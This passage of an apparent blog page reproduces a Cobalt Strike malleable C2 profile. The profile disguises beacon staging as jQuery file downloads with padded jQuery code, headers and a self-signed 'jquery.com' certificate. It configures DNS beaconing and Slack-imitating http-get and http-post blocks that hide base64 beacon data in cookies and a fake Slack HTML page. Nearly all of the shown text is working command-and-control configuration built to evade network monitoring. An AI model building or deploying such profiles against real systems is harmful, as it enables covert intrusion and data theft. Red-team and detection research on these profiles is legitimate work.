w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;  </span><br><span class="line">    # æ§åˆ¶åˆ†é˜¶æ®µä¸‹è½½payloadçš„æ–¹å¼</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    </span><br><span class="line">    ## Option <span class="number">1</span>) Trusted and Signed Certificate</span><br><span class="line">    ## Use keytool to create a Java Keystore file. </span><br><span class="line">    ## Refer to https:<span class="comment">//www.cobaltstrike.com/help-malleable-c2#validssl</span></span><br><span class="line">    #<span class="meta"># or https:<span class="comment">//github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span></span></span><br><span class="line">   </span><br><span class="line">    ## Option <span class="number">2</span>) Create your own Self-Signed Certificate</span><br><span class="line">    ## Use keytool to import your own self <span class="type">signed</span> certificates</span><br><span class="line"></span><br><span class="line">    <span class="meta">#set keystore <span class="string">&quot;/pathtokeystore&quot;</span>;</span></span><br><span class="line">    <span class="meta">#set password <span class="string">&quot;password&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">    ## Option <span class="number">3</span>) Cobalt Strike Self-Signed Certificate</span><br><span class="line">    <span class="built_in">set</span> C   <span class="string">&quot;US&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> CN  <span class="string">&quot;jquery.com&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> O   <span class="string">&quot;jQuery&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU  <span class="string">&quot;Certificate Authority&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dns-beacon &#123;</span><br><span class="line">    # Options moved into <span class="string">&quot;dns-beacon&quot;</span> group in version <span class="number">4.3</span></span><br><span class="line">    <span class="built_in">set</span> dns_idle           <span class="string">&quot;74.125.196.113&quot;</span>; <span class="meta">#google.com (change this to match your campaign)</span></span><br><span class="line">    <span class="built_in">set</span> dns_max_txt        <span class="string">&quot;252&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep          <span class="string">&quot;0&quot;</span>; #    Force a sleep prior to each individual DNS request. (in milliseconds)</span><br><span class="line">    <span class="built_in">set</span> dns_ttl            <span class="string">&quot;5&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns             <span class="string">&quot;255&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend <span class="string">&quot;.resources.123456.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost <span class="string">&quot;.feeds.123456.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # DNS subhosts override options, added in version <span class="number">4.3</span></span><br><span class="line">    <span class="built_in">set</span> beacon           <span class="string">&quot;a.bc.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A            <span class="string">&quot;b.1a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA         <span class="string">&quot;c.4a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT          <span class="string">&quot;d.tx.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata     <span class="string">&quot;e.md.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output       <span class="string">&quot;f.po.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response      <span class="string">&quot;zero&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># getè¯·æ±‚çš„uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/messages/H4j8yG&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    append <span class="string">&quot;;_ga=GA1.2.875&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;;__ar_v4=%8867UMDGS643&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;d=&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;_ga=GA1.2.875;&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;b=.12vPkW22o;&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html; charset=utf-8&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;private, no-cache, no-store, must-revalidate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Frame-Options&quot;</span> <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-w6k7&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64;</span><br><span class="line">prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=\&quot;en-US\&quot; class=\&quot;supports_custom_scrollbar\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge,chrome=1\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;referrer\&quot; content=\&quot;no-referrer\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;superfish\&quot; content=\&quot;nofish\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Microsoft Developer Chat Slack&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;author\&quot; content=\&quot;Slack\&quot;&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;https://a.slack-edge.com?id=&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;\&quot;&gt; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    append <span class="string">&quot;&lt;div id=\&quot;client-ui\&quot; class=\&quot;container-fluid sidebar_theme_\&quot;\&quot;\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;banner\&quot; class=\&quot;hidden\&quot; role=\&quot;complementary\&quot; aria-labelledby=\&quot;notifications_banner_aria_label\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h1 id=\&quot;notifications_banner_aria_label\&quot; class=\&quot;offscreen\&quot;&gt;Notifications Banner&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;notifications_banner\&quot; class=\&quot;banner sk_fill_blue_bg hidden\&quot;&gt;</span></span><br><span class="line"><span class="string">    Slack needs your permission to &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot;&gt;enable desktop notifications&lt;/button&gt;.        &lt;button type=\&quot;button\&quot; class=\&quot;btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\&quot; data-action=\&quot;dismiss_banner\&quot; aria-label=\&quot;Dismiss\&quot;&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;notifications_dismiss_banner\&quot; class=\&quot;banner seafoam_green_bg hidden\&quot;&gt;</span></span><br><span class="line"><span class="string">    We strongly recommend enabling desktop notifications if youâ€™ll be using Slack on this computer.        &lt;span class=\&quot;inline_block no_wrap\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\&quot;&gt;Enable notifications&lt;/button&gt; â€¢</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.close()\&quot;&gt;Ask me next time&lt;/button&gt; â€¢</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.closeNagAndSetCookie()\&quot;&gt;Never ask again on this computer&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;&quot;</span>;</span><br><span class="line">print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/messages/oYVDqI&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    append <span class="string">&quot;;_ga=GA1.2.875&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;__ar_v4=%8867UMDGS643&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;d=&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;_ga=GA1.2.875;&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;b=.12vPkW22o;&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;GA1.&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;_ga&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/json; charset=utf-8&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span 